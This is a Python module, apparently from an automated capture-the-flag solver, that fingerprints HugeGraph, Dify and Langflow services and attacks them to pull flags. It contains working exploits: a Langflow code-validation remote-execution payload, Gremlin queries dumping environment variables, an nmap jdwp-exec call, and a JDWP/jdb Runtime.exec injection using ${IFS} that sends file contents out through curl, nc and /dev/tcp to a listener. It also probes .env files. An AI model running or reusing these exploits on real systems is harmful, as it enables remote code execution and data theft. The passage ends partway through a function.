"""Benchmark 容器探测、候选派生和服务指纹逻辑。"""
from __future__ import annotations

from collections.abc import Iterable
from pathlib import Path
import json
import re as _re_mod
import socket as socket_mod
import subprocess
import tempfile
import time as time_mod
from typing import Any
from urllib.parse import parse_qsl as _parse_qsl
from urllib.parse import quote as _url_quote
from urllib.parse import urlencode as _urlencode
from urllib.parse import urljoin as _urljoin
from urllib.parse import urlparse as _urlparse
from urllib.parse import urlunparse as _urlunparse

from . import benchmark_profiles as benchmark_profile_utils


class BenchmarkProbeMixin:
    """Benchmark 容器探测与证据扩展能力。"""

    @staticmethod
    def _benchmark_builtin_probe_paths() -> list[str]:
        return benchmark_profile_utils.builtin_probe_paths()

    def _benchmark_probe_paths(self) -> list[str]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("probe_paths"), limit=160)
        with self._benchmark_state_lock:
            observed = sorted(
                str(item)
                for item in self._benchmark_state.get("observed_probe_paths", set())
                if item
            )
        builtin = (
            self._benchmark_builtin_probe_paths()
            if self._benchmark_builtin_section_enabled("probe_paths")
            else []
        )
        paths = list(dict.fromkeys(builtin + observed + list(external)))
        return paths[: self._benchmark_control_int("max_probe_paths")]

    @staticmethod
    def _benchmark_safe_observed_probe_path(base: str, url: str) -> str | None:
        return benchmark_profile_utils.safe_observed_probe_path(base, url)

    def _benchmark_observed_param_names(self) -> set[str]:
        with self._benchmark_state_lock:
            return {
                str(name)
                for name in self._benchmark_state.get("observed_param_names", set())
                if _re_mod.fullmatch(r"[A-Za-z0-9_-]{1,40}", str(name))
            }

    def _benchmark_note_observed_candidates(
        self,
        *,
        base: str,
        urls: Iterable[str] = (),
        param_names: Iterable[str] = (),
    ) -> None:
        if not self._is_benchmark_aggressive():
            return
        safe_paths = {
            path
            for url in urls
            if (path := self._benchmark_safe_observed_probe_path(base, str(url)))
        }
        safe_params = {
            str(name)
            for name in param_names
            if _re_mod.fullmatch(r"[A-Za-z0-9_-]{1,40}", str(name))
        }
        if not safe_paths and not safe_params:
            return
        changed = False
        with self._benchmark_state_lock:
            paths = set(self._benchmark_state.get("observed_probe_paths", set()))
            params = set(self._benchmark_state.get("observed_param_names", set()))
            old_paths_len = len(paths)
            old_params_len = len(params)
            paths.update(safe_paths)
            params.update(safe_params)
            self._benchmark_state["observed_probe_paths"] = set(sorted(paths)[:240])
            self._benchmark_state["observed_param_names"] = set(sorted(params)[:120])
            changed = old_paths_len != len(paths) or old_params_len != len(params)
        if changed:
            self._persist_benchmark_state()

    @staticmethod
    def _benchmark_builtin_flag_paths() -> tuple[str, ...]:
        return benchmark_profile_utils.builtin_flag_paths()

    @staticmethod
    def _benchmark_is_safe_flag_path(path: str) -> bool:
        return benchmark_profile_utils.is_safe_flag_path(path)

    def _benchmark_flag_paths(self, *, limit: int | None = None) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("flag_paths"), limit=80)
        builtin = (
            self._benchmark_builtin_flag_paths()
            if self._benchmark_builtin_section_enabled("flag_paths")
            else ()
        )
        paths: list[str] = []
        for raw_path in builtin + external:
            path = str(raw_path or "").strip()
            if not path:
                continue
            if not path.startswith("/"):
                path = f"/{path}"
            if not self._benchmark_is_safe_flag_path(path):
                continue
            paths.append(path)
        effective_limit = (
            self._benchmark_control_int("max_flag_paths")
            if limit is None
            else max(1, min(limit, self._benchmark_control_int("max_flag_paths"), 100))
        )
        return tuple(dict.fromkeys(paths))[:effective_limit]

    def _benchmark_flag_cat_command(self, *, limit: int = 10) -> str:
        paths = self._benchmark_flag_paths(limit=limit)
        return f"cat {' '.join(paths)} 2>/dev/null\n"

    def _benchmark_builtin_service_probe_profiles(self) -> list[dict[str, Any]]:
        return [
            {
                "fingerprint": "hugegraph",
                "match_any": (
                    '"service":"hugegraph"',
                    '"service": "hugegraph"',
                    "hugegraph.apache.org",
                ),
                "match_any_all": (
                    ('"gremlin"', '"arthas"'),
                ),
                "probe": self._benchmark_probe_hugegraph_local,
                "unresolved": "reasoning",
                "reason": (
                    "HugeGraph/Gremlin/Arthas/JDWP 服务指纹已确认，需要服务专项深挖"
                ),
            },
            {
                "fingerprint": "dify",
                "match_all": (
                    "data-api-prefix",
                    "127.0.0.1:5001",
                ),
                "match_any": (
                    "dify",
                    "self_hosted",
                    "/_next/static/",
                    "x-powered-by: next.js",
                ),
                "probe": self._benchmark_probe_dify_local,
                "unresolved": "reasoning",
                "reason": (
                    "Dify/Next.js 前端可达但后端疑似绑定 localhost，需要 Dify 专项深挖"
                ),
            },
            {
                "fingerprint": "langflow",
                "match_all": ("langflow",),
                "match_any": (
                    "<title>langflow</title>",
                    '"title":"langflow"',
                    "/api/v1/validate/code",
                    "server: uvicorn",
                ),
                "probe": lambda code, base, _evidence: self._benchmark_probe_langflow_local(
                    code,
                    base,
                ),
                "unresolved": "abandoned",
                "reason": "Langflow bounded validate/code 探测未发现可提交 flag",
            },
        ]

    def _benchmark_service_probe_registry(self) -> dict[str, Any]:
        return {
            "dify": self._benchmark_probe_dify_local,
            "hugegraph": self._benchmark_probe_hugegraph_local,
            "langflow": lambda code, base, _evidence: self._benchmark_probe_langflow_local(
                code,
                base,
            ),
        }

    @staticmethod
    def _benchmark_normalize_probe_headers(raw: Any) -> dict[str, str]:
        return benchmark_profile_utils.normalize_probe_headers(raw)

    @staticmethod
    def _benchmark_normalize_probe_body(raw: Any) -> dict[str, Any] | None:
        return benchmark_profile_utils.normalize_probe_body(raw)

    def _benchmark_normalize_probe_requests(self, raw: Any) -> tuple[dict[str, Any], ...]:
        return benchmark_profile_utils.normalize_probe_requests(raw)

    @staticmethod
    def _benchmark_normalize_tcp_ports(raw: Any) -> tuple[dict[str, Any], ...]:
        return benchmark_profile_utils.normalize_tcp_ports(raw)

    def _benchmark_normalize_service_probe_profile(
        self,
        raw: Any,
    ) -> dict[str, Any] | None:
        if not isinstance(raw, dict):
            return None
        fingerprint = str(raw.get("fingerprint") or "").strip().lower()
        if not _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", fingerprint):
            return None
        profile: dict[str, Any] = {"fingerprint": fingerprint}
        for key in ("match_all", "match_any"):
            values = self._benchmark_string_tuple(raw.get(key))
            if values:
                profile[key] = values
        any_all = self._benchmark_match_any_all_tuple(raw.get("match_any_all"))
        if any_all:
            profile["match_any_all"] = any_all
        unresolved = str(raw.get("unresolved") or "reasoning").strip().lower()
        profile["unresolved"] = unresolved if unresolved in {"reasoning", "abandoned"} else "reasoning"
        reason = str(raw.get("reason") or "").strip()
        if reason:
            profile["reason"] = reason[:500]
        handoff_context = str(raw.get("handoff_context") or "").strip()
        if handoff_context:
            profile["handoff_context"] = handoff_context[:3000]
        evidence_focus = self._benchmark_string_tuple(
            raw.get("evidence_focus", raw.get("handoff_focus")),
            limit=20,
        )
        if evidence_focus:
            profile["evidence_focus"] = evidence_focus
        avoid_focus = self._benchmark_string_tuple(
            raw.get("avoid_focus", raw.get("avoid")),
            limit=20,
        )
        if avoid_focus:
            profile["avoid_focus"] = avoid_focus
        probe_paths = self._benchmark_string_tuple(raw.get("probe_paths"), limit=40)
        if probe_paths:
            profile["probe_paths"] = probe_paths
        probe_requests = self._benchmark_normalize_probe_requests(raw.get("probe_requests"))
        if probe_requests:
            profile["probe_requests"] = probe_requests
        tcp_ports = self._benchmark_normalize_tcp_ports(raw.get("tcp_ports"))
        if tcp_ports:
            profile["tcp_ports"] = tcp_ports
        probe_key = str(raw.get("probe_key") or "").strip().lower()
        probe = self._benchmark_service_probe_registry().get(probe_key)
        if callable(probe):
            profile["probe"] = probe
        if not any(
            key in profile
            for key in (
                "match_all",
                "match_any",
                "match_any_all",
                "probe_paths",
                "probe_requests",
                "tcp_ports",
                "handoff_context",
                "evidence_focus",
                "avoid_focus",
                "reason",
                "probe",
            )
        ):
            return None
        return profile

    def _benchmark_external_service_probe_profiles(self) -> list[dict[str, Any]]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("service_probe_profiles", data.get("service_profiles", []))
        if not isinstance(raw_profiles, list):
            return []
        profiles: list[dict[str, Any]] = []
        for raw in raw_profiles[:40]:
            profile = self._benchmark_normalize_service_probe_profile(raw)
            if profile is not None:
                profiles.append(profile)
        return profiles

    def _benchmark_service_probe_profiles(self) -> list[dict[str, Any]]:
        disabled = self._benchmark_disabled_builtin_fingerprints()
        builtin = [
            profile
            for profile in self._benchmark_builtin_service_probe_profiles()
            if str(profile.get("fingerprint") or "").lower() not in disabled
        ]
        return self._benchmark_merge_profiles_by_key(
            builtin,
            self._benchmark_external_service_probe_profiles(),
            "fingerprint",
        )

    @staticmethod
    def _benchmark_text_matches_profile(
        text: str,
        profile: dict[str, Any],
    ) -> bool:
        lowered = text.lower()
        all_tokens = tuple(str(token).lower() for token in profile.get("match_all", ()))
        any_tokens = tuple(str(token).lower() for token in profile.get("match_any", ()))
        any_all_groups = tuple(profile.get("match_any_all", ()))

        if all_tokens and not all(token in lowered for token in all_tokens):
            return False
        if any_tokens and any(token in lowered for token in any_tokens):
            return True
        for raw_group in any_all_groups:
            group = tuple(str(token).lower() for token in raw_group)
            if group and all(token in lowered for token in group):
                return True
        return bool(all_tokens) and not any_tokens and not any_all_groups

    def _benchmark_probe_matching_service_local(
        self,
        code: str,
        base: str,
        evidence: str,
    ) -> tuple[bool, list[str]]:
        profile = self._benchmark_matching_service_probe_profile(evidence)
        if profile is None:
            return False, []
        service_outputs = self._benchmark_run_service_probe_profile(
            code,
            base,
            evidence,
            profile,
        )
        return True, service_outputs

    def _benchmark_matching_service_probe_profile(
        self,
        evidence: str,
    ) -> dict[str, Any] | None:
        for profile in self._benchmark_service_probe_profiles():
            suggests = profile.get("suggests")
            if callable(suggests):
                matched = bool(suggests(evidence))
            else:
                matched = self._benchmark_text_matches_profile(evidence, profile)
            if matched:
                return profile
        return None

    def _benchmark_run_service_probe_profile(
        self,
        code: str,
        base: str,
        evidence: str,
        profile: dict[str, Any],
    ) -> list[str]:
        fingerprint = str(profile["fingerprint"])
        self._benchmark_set_service_fingerprint(code, fingerprint)
        service_outputs: list[str] = []
        probe = profile.get("probe")
        if callable(probe):
            service_output = probe(code, base, evidence)
            if service_output:
                service_outputs.append(str(service_output))
        profile_path_output = self._benchmark_probe_profile_paths_local(
            code,
            base,
            profile,
        )
        if profile_path_output:
            service_outputs.append(profile_path_output)
        profile_request_output = self._benchmark_probe_profile_requests_local(
            code,
            base,
            profile,
        )
        if profile_request_output:
            service_outputs.append(profile_request_output)
        tcp_output = self._benchmark_probe_profile_tcp_ports_local(code, base, profile)
        if tcp_output:
            service_outputs.append(tcp_output)
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
        if code in completed:
            return service_outputs
        reason = str(profile.get("reason") or f"{fingerprint} bounded probe 未发现 flag")
        if profile.get("unresolved") == "reasoning":
            self._benchmark_mark_reasoning_needed(code, reason)
        else:
            self._benchmark_mark_abandoned(code, reason)
        return service_outputs

    def _benchmark_probe_profile_paths_local(
        self,
        code: str,
        base: str,
        profile: dict[str, Any],
    ) -> str:
        paths = self._benchmark_string_tuple(profile.get("probe_paths"), limit=20)
        if not paths:
            return ""
        fingerprint = str(profile.get("fingerprint") or "service")
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## {fingerprint}-profile-probe {base}"]
        seen: set[str] = set()
        for raw_path in paths:
            path = raw_path.lstrip("/")
            url = _urljoin(base, path)
            if url in seen:
                continue
            seen.add(url)
            result = self._benchmark_curl_local(
                url,
                tun_interface=tun_interface,
                timeout=8,
            )
            body = (result.stdout or "")[:5000]
            outputs.append(
                f"## GET /{path}\n{body}\n{(result.stderr or '')[:300]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: {fingerprint}_profile_probe {url}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
        return "\n".join(outputs)

    def _benchmark_probe_profile_requests_local(
        self,
        code: str,
        base: str,
        profile: dict[str, Any],
    ) -> str:
        raw_requests = profile.get("probe_requests")
        if not isinstance(raw_requests, (tuple, list)) or not raw_requests:
            return ""
        fingerprint = str(profile.get("fingerprint") or "service")
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## {fingerprint}-profile-requests {base}"]
        seen: set[tuple[str, str, str]] = set()
        for request in list(raw_requests)[:12]:
            if not isinstance(request, dict):
                continue
            method = str(request.get("method") or "GET").upper()
            path = str(request.get("path") or "").lstrip("/")
            url = _urljoin(base, path)
            body_key = json.dumps(
                request.get("json", request.get("data", "")),
                ensure_ascii=False,
                sort_keys=True,
                default=str,
            )[:1000]
            dedupe_key = (method, url, body_key)
            if dedupe_key in seen:
                continue
            seen.add(dedupe_key)
            label = str(request.get("label") or f"{method} /{path}")[:140]
            result: subprocess.CompletedProcess[str]
            if "json" in request:
                cmd = [
                    "curl",
                    "-sS",
                    "-k",
                    "--interface",
                    tun_interface,
                    "--connect-timeout",
                    "2",
                    "--max-time",
                    "6",
                    "--globoff",
                    "-i",
                    "-X",
                    method,
                    "-H",
                    "Content-Type: application/json",
                ]
                for header, value in dict(request.get("headers") or {}).items():
                    cmd.extend(["-H", f"{header}: {value}"])
                cmd.extend([
                    "-d",
                    json.dumps(request["json"], ensure_ascii=False, separators=(",", ":")),
                    url,
                ])
                try:
                    result = subprocess.run(
                        cmd,
                        check=False,
                        text=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=8,
                    )
                except Exception as exc:
                    result = subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))
            else:
                data = request.get("data")
                headers = dict(request.get("headers") or {})
                if method == "GET" and not headers and not data:
                    result = self._benchmark_curl_local(
                        url,
                        tun_interface=tun_interface,
                        timeout=8,
                    )
                else:
                    cmd = [
                        "curl",
                        "-sS",
                        "-k",
                        "--interface",
                        tun_interface,
                        "--connect-timeout",
                        "2",
                        "--max-time",
                        "6",
                        "--globoff",
                        "-i",
                        "-X",
                        method,
                    ]
                    for header, value in headers.items():
                        cmd.extend(["-H", f"{header}: {value}"])
                    if isinstance(data, dict):
                        for key, value in data.items():
                            cmd.extend(["--data-urlencode", f"{key}={value}"])
                    cmd.append(url)
                    try:
                        result = subprocess.run(
                            cmd,
                            check=False,
                            text=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            timeout=8,
                        )
                    except Exception as exc:
                        result = subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))
            body = (result.stdout or "")[:5000]
            outputs.append(f"## {label}\n{body}\n{(result.stderr or '')[:300]}")
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: {fingerprint}_profile_request {label} {url}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
        return "\n".join(outputs)

    def _benchmark_probe_profile_tcp_ports_local(
        self,
        code: str,
        base: str,
        profile: dict[str, Any],
    ) -> str:
        raw_ports = profile.get("tcp_ports")
        if not isinstance(raw_ports, (tuple, list)) or not raw_ports:
            return ""
        parsed = _urlparse(base)
        host = parsed.hostname or ""
        if not host:
            return ""
        fingerprint = str(profile.get("fingerprint") or "service")
        outputs: list[str] = [f"## {fingerprint}-tcp-probe {host}"]
        seen: set[int] = set()
        for entry in list(raw_ports)[:12]:
            if not isinstance(entry, dict):
                continue
            try:
                port = int(entry.get("port"))
            except (TypeError, ValueError):
                continue
            if port in seen:
                continue
            seen.add(port)
            label = str(entry.get("label") or f"tcp/{port}")[:80]
            reachable = self._benchmark_probe_tcp_port(host, port)
            outputs.append(f"## {label} {host}:{port}\nreachable={reachable}")
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: {fingerprint}_tcp_probe {host}:{port}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                "退出码: 0\n"
                "输出:\n"
                f"{label} reachable={reachable}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
        return "\n".join(outputs)

    def _benchmark_probe_langflow_local(self, code: str, base: str) -> str:
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## langflow-probe {base}"]

        for path in ("api/v1/version", "api/v1/config", "openapi.json"):
            result = self._benchmark_curl_local(
                _urljoin(base, path),
                tun_interface=tun_interface,
                timeout=8,
            )
            body = (result.stdout or "")[:5000]
            outputs.append(f"## GET /{path}\n{body}\n{(result.stderr or '')[:300]}")
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: langflow_probe {_urljoin(base, path)}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        for flag_path in self._benchmark_flag_paths(limit=20):
            payload = {
                "code": (
                    "@exec(\"raise Exception(open("
                    f"{flag_path!r}"
                    ").read())\")\n"
                    "def probe():\n"
                    "    pass\n"
                )
            }
            result = self._benchmark_curl_json_local(
                _urljoin(base, "api/v1/validate/code"),
                tun_interface=tun_interface,
                method="POST",
                payload=payload,
                timeout=8,
            )
            body = result.stdout or ""
            outputs.append(
                f"## POST /api/v1/validate/code {flag_path}\n"
                f"{body[:3000]}\n{(result.stderr or '')[:300]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: langflow_validate_code {_urljoin(base, 'api/v1/validate/code')}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body[:12000]}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
        return "\n".join(outputs)

    def _benchmark_probe_dify_local(self, code: str, base: str, probe: str) -> str:
        """Run bounded Dify/Next.js checks and keep the active task for reasoning."""
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## dify-probe {base}"]
        collected = probe

        def append_result(label: str, result: subprocess.CompletedProcess[str]) -> None:
            nonlocal collected
            body = result.stdout or ""
            collected += "\n" + body
            interesting = "\n".join(
                line[:500]
                for line in body.splitlines()
                if any(
                    marker in line.lower()
                    for marker in (
                        "flag{",
                        "tsec{",
                        "ctf{",
                        "data-api-prefix",
                        "127.0.0.1:5001",
                        "console/api",
                        "/api/",
                        "not_setup",
                        "already_setup",
                        "signin",
                        "install",
                        "secret",
                        "token",
                    )
                )
            )
            status = (body.splitlines() or [""])[0][:160]
            outputs.append(
                f"## {label}\n{status}\n{interesting[:2500]}\n{(result.stderr or '')[:300]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: dify_probe {label} {base}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body[:12000]}"
            )

        for path in (
            "apps",
            "signin",
            "install",
            "console/api/setup",
            "console/api/system-features",
            "console/api/version",
            "api/site",
            "api/parameters",
            "flag",
            "api/flag",
            ".env",
            ".env.local",
        ):
            result = self._benchmark_curl_local(
                _urljoin(base, path),
                tun_interface=tun_interface,
                timeout=7,
            )
            append_result(f"GET /{path}", result)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        chunk_paths = list(
            dict.fromkeys(
                _re_mod.findall(
                    r"""/_next/static/chunks/[^"'\s<>]+?\.js""",
                    collected,
                )
            )
        )
        for chunk_path in chunk_paths[:24]:
            result = self._benchmark_curl_local(
                _urljoin(base, chunk_path),
                tun_interface=tun_interface,
                timeout=8,
            )
            append_result(f"GET {chunk_path}", result)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        return "\n".join(outputs)

    def _benchmark_probe_hugegraph_local(self, code: str, base: str, probe: str) -> str:
        """Run bounded HugeGraph-specific checks before falling back to reasoning."""
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## hugegraph-probe {base}"]

        def append_http(label: str, result: subprocess.CompletedProcess[str]) -> None:
            body = (result.stdout or "")[:5000]
            outputs.append(
                f"## {label}\n{body}\n{(result.stderr or '')[:500]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: hugegraph_probe {label} {base}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )

        for path in (
            "versions",
            "graphs",
            "graphs/hugegraph/schema",
            "graphs/hugegraph/variables",
            "graphs/hugegraph/conf",
            "graphs/hugegraph/graph/vertices?limit=10",
            "graphs/hugegraph/graph/edges?limit=10",
        ):
            result = self._benchmark_curl_local(
                _urljoin(base, path),
                tun_interface=tun_interface,
                timeout=7,
            )
            append_http(f"GET /{path}", result)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        for expression in (
            "System.getenv()",
            "System.getProperties()",
            "hugegraph.traversal().V().limit(10).toList()",
            "hugegraph.traversal().E().limit(10).toList()",
        ):
            cmd = [
                "curl",
                "-sS",
                "-k",
                "--interface",
                tun_interface,
                "--connect-timeout",
                "2",
                "--max-time",
                "8",
                "--globoff",
                "-i",
                "-X",
                "POST",
                "-H",
                "Content-Type: application/json",
                "-d",
                json.dumps({"gremlin": expression}, separators=(",", ":")),
                _urljoin(base, "gremlin"),
            ]
            try:
                result = subprocess.run(
                    cmd,
                    check=False,
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=10,
                )
            except Exception as exc:
                result = subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))
            append_http(f"POST /gremlin {expression}", result)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        arthas = self._benchmark_curl_json_local(
            _urljoin(base, "arthas"),
            tun_interface=tun_interface,
            method="PUT",
            payload={"command": "help"},
            timeout=8,
        )
        append_http("PUT /arthas help", arthas)

        parsed = _urlparse(base)
        host = parsed.hostname or ""
        if host:
            for port, label in ((5005, "JDWP"), (8561, "Arthas HTTP"), (8562, "Arthas telnet")):
                reachable = self._benchmark_probe_tcp_port(host, port)
                outputs.append(f"## {label} {host}:{port}\nreachable={reachable}")
            jdwp_output = self._benchmark_probe_jdwp_local(host, 5005, base)
            if jdwp_output:
                outputs.append(jdwp_output)
                self._benchmark_auto_submit_flags_from_tool_result(
                    f"命令: jdwp_probe http://{host}:5005\n"
                    "工作目录: /home/my/cyber/benchmark_test\n"
                    "退出码: 0\n"
                    "输出:\n"
                    f"{jdwp_output}"
                )
        return "\n".join(outputs)

    def _benchmark_curl_json_local(
        self,
        url: str,
        *,
        tun_interface: str,
        method: str = "POST",
        payload: dict[str, Any] | None = None,
        timeout: int = 8,
    ) -> subprocess.CompletedProcess[str]:
        cmd = [
            "curl",
            "-sS",
            "-k",
            "--interface",
            tun_interface,
            "--connect-timeout",
            "2",
            "--max-time",
            str(max(3, timeout - 2)),
            "--globoff",
            "-i",
            "-X",
            method.upper(),
            "-H",
            "Content-Type: application/json",
        ]
        if payload is not None:
            cmd.extend(["-d", json.dumps(payload, ensure_ascii=False, separators=(",", ":"))])
        cmd.append(url)
        try:
            return subprocess.run(
                cmd,
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
        except Exception as exc:
            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))

    @staticmethod
    def _benchmark_probe_tcp_port(host: str, port: int) -> bool:
        try:
            with socket_mod.create_connection((host, port), timeout=2):
                return True
        except OSError:
            return False

    def _benchmark_probe_jdwp_local(
        self,
        host: str,
        port: int,
        trigger_base: str = "",
    ) -> str:
        if not self._benchmark_probe_tcp_port(host, port):
            return ""
        outputs = [f"## jdwp-probe {host}:{port}", "JDWP port reachable"]
        try:
            with socket_mod.create_connection((host, port), timeout=3) as sock:
                sock.settimeout(3)
                sock.sendall(b"JDWP-Handshake")
                reply = sock.recv(14)
                outputs.append(f"handshake={reply.decode('ascii', errors='replace')!r}")
        except OSError as exc:
            outputs.append(f"handshake_error={exc}")
            return "\n".join(outputs)

        nmap_flag_command = self._benchmark_flag_cat_command(limit=20).strip()
        nmap_cmd = [
            "nmap",
            "-n",
            "-Pn",
            "-sT",
            f"-p{port}",
            "--script=+jdwp-exec",
            "--script-args",
            f"cmd={nmap_flag_command}",
            host,
        ]
        try:
            result = subprocess.run(
                nmap_cmd,
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=20,
            )
            outputs.append(
                f"## jdwp-exec {nmap_flag_command}\n"
                f"{(result.stdout or '')[:5000]}\n{(result.stderr or '')[:1000]}"
            )
        except Exception as exc:
            outputs.append(f"jdwp_exec_error={exc}")
        jdb_output = self._benchmark_probe_jdwp_jdb_exfil_local(
            host,
            port,
            trigger_base,
        )
        if jdb_output:
            outputs.append(jdb_output)
        return "\n".join(outputs)

    def _benchmark_probe_jdwp_jdb_exfil_local(
        self,
        host: str,
        port: int,
        trigger_base: str = "",
    ) -> str:
        """Use jdb once to trigger Runtime.exec and exfiltrate common flag paths.

        This is intentionally bounded. JDWP targets are high-value, but an
        interactive debugger can otherwise keep an easy Benchmark task alive
        forever. If this returns no flag, the caller should prefer close/switch.
        """
        tun = self._benchmark_detect_tun_local()
        if not tun:
            return "## jdwp-jdb-exfil\nskip=no_tun_interface"
        tun_interface, tun_ip = tun
        if not tun_ip:
            return "## jdwp-jdb-exfil\nskip=no_tun_ip"

        listener = socket_mod.socket(socket_mod.AF_INET, socket_mod.SOCK_STREAM)
        listener.setsockopt(socket_mod.SOL_SOCKET, socket_mod.SO_REUSEADDR, 1)
        try:
            listener.bind((tun_ip, 0))
            listener.listen(2)
            listener.settimeout(18)
            listen_port = int(listener.getsockname()[1])
        except OSError as exc:
            listener.close()
            return f"## jdwp-jdb-exfil\nlistener_error={exc}"

        received: list[bytes] = []

        def accept_once() -> None:
            try:
                conn, _addr = listener.accept()
                with conn:
                    conn.settimeout(2)
                    chunks: list[bytes] = []
                    while True:
                        try:
                            chunk = conn.recv(4096)
                        except OSError:
                            break
                        if not chunk:
                            break
                        chunks.append(chunk)
                        if sum(len(part) for part in chunks) > 65536:
                            break
                    received.append(b"".join(chunks))
            except OSError:
                return
            finally:
                try:
                    listener.close()
                except OSError:
                    pass

        accept_thread = threading.Thread(target=accept_once, daemon=True)
        accept_thread.start()

        path_list = "${IFS}".join(self._benchmark_flag_paths(limit=20))
        file_loop = (
            f"for${{IFS}}f${{IFS}}in${{IFS}}{path_list};"
            "do${IFS}[${IFS}-r${IFS}$f${IFS}]&&cat${IFS}$f;"
            "done"
        )
        callbacks = (
            f"{file_loop}|curl${{IFS}}-m${{IFS}}3${{IFS}}-sS${{IFS}}-XPOST"
            f"${{IFS}}--data-binary${{IFS}}@-${{IFS}}http://{tun_ip}:{listen_port}/",
            f"{file_loop}|nc${{IFS}}{tun_ip}${{IFS}}{listen_port}",
            f"{file_loop}>/dev/tcp/{tun_ip}/{listen_port}",
        )
        commands = [
            "stop in java.lang.String.indexOf(java.lang.String)",
            "stop in java.lang.String.equals(java.lang.Object)",
        ]
        commands.extend(
            f'print java.lang.Runtime.getRuntime().exec("/bin/sh -c {payload}")'
            for payload in callbacks
        )
        commands.append("cont")
        commands.append("quit")

        proc: subprocess.Popen[str] | None = None
        trigger_stdout = ""
        trigger_stderr = ""
        jdb_output = ""
        try:
            proc = subprocess.Popen(
                ["jdb", "-attach", f"{host}:{port}"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            time_mod.sleep(1.5)
            if proc.stdin is not None:
                proc.stdin.write(commands[0] + "\n")
                proc.stdin.write(commands[1] + "\n")
                proc.stdin.flush()
            trigger_url = _urljoin(trigger_base or f"http://{host}:8080/", "versions")
            trigger = subprocess.run(
                [
                    "curl",
                    "-sS",
                    "--interface",
                    tun_interface,
                    "--connect-timeout",
                    "2",
                    "--max-time",
                    "5",
                    trigger_url,
                ],
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=7,
            )
            trigger_stdout = trigger.stdout[:300]
            trigger_stderr = trigger.stderr[:300]
            time_mod.sleep(1.5)
            if proc.stdin is not None:
                for command in commands[2:]:
                    proc.stdin.write(command + "\n")
                    proc.stdin.flush()
                    time_mod.sleep(0.2)
            try:
                jdb_output, _ = proc.communicate(timeout=6)
            except subprocess.TimeoutExpired:
                proc.kill()
                jdb_output, _ = proc.communicate(timeout=3)
        except Exception as exc:
            if proc is not None:
                try:
                    proc.kill()
                except Exception:
                    pass
            return f"## jdwp-jdb-exfil\nerror={exc}"
        finally:
            try:
                listener.close()
            except OSError:
                pass

        accept_thread.join(timeout=1)
        callback_text = b"\n".join(received).decode("utf-8", errors="replace")
        return (
            "## jdwp-jdb-exfil\n"
            f"listener={tun_ip}:{listen_port}\n"
            f"trigger_stdout={trigger_stdout}\n"
            f"trigger_stderr={trigger_stderr}\n"
            f"callback={callback_text[:4000]}\n"
            f"jdb={jdb_output[:4000]}"
        )

    def _benchmark_probe_common_webapp_flows(
        self,
        code: str,
        base: str,
        probe: str,
        *,
        deadline: float | None = None,
    ) -> str:
        """Follow common benchmark web-app clues that need cookies or state.

